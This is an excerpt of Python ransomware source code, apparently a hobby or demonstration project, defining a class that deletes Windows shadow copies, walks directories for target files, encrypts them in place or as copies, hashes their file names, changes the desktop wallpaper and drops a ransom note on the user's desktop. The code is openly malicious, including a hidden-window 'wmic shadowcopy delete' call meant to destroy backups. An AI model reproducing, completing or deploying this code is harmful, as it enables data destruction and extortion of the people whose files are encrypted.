...
'''
    The class starts with classic ransomware features like deleting backups, (in this case shadow copys), continuing with path traversal, which idetifies 
    all target files in the system. The files are then encrypted and the names are hashed. Then the background is changed and a ransom note is placed in the user's desktop. 
'''
class Rmware:
    
    CREATE_NO_WINDOW = 0x08000000 # Flag for not opening new console, when executing a shell command
    SPI_SETDESKWALLPAPER = 20 # Flag for changing the background of the desktop

    def __init__(self, threadsNum = 0, displayEmails=False, driveList=list(), fileSuffixList=list(), filesToEncrypt=list(), encr=Encrypter(), desktopBackground="", ransomnote="", fileMod="inplace", user="", encArea="desktop",dirBlacklist=list()) -> None:
    ...
    def changeBackground(self) -> None:
        if self.desktopBackground == "":
            return
        windll.user32.SystemParametersInfoW(self.SPI_SETDESKWALLPAPER, 0, self.desktopBackground, 3)
    

    '''
        Deletes the shadow copies, which are used for restoring previous versions of files
        For this method administrative rights are necessary
    '''
    def delShadowCopy(self) -> None:
        result = call('wmic shadowcopy delete', shell = True, creationflags=self.CREATE_NO_WINDOW) # uses wmic to delete all shadowcopies on the system (must be executet with elevated / admin rights)
    ...
    '''
        Uses the method "dirTraversal" and checks which option was choosed for encArea
    '''
    ...
    '''
        Recursivly enters directories and appends matching files to the filesToEncrypt-list
    ...
    def overwriteEnc(self, filePath) -> None: # modifys the orginal file
        try:
            with open(filePath, 'rb+') as f:
                ...
                rename(filePath, path + self.encr.fileNameByHashSHA1(filePath.split('\\')[-1]))
    ...
    '''
    def copyFileEnc(self, filePath) -> None: # creates a encrypted copy and deletes the orginal
        try:
            orginal = open(filePath, 'rb+')
            data = orginal.read()
            orginal.close()
            cipher = self.encr.enc(data)
            path = filePath.replace(filePath.split("\\")[-1], "") #full path of the directory, where the orginal is saved
            copy = open(path + self.encr.fileNameByHashSHA1(filePath.split('\\')[-1]), 'wb') # create and open new file for saving the cipher
    ...
    def placeRansom(self) -> None:
        ...
        ransom.close
        ransomDesktop = open("\\Users\\" + self.user + "\\Desktop\\Lösegeldaufforderung.docx", "wb")
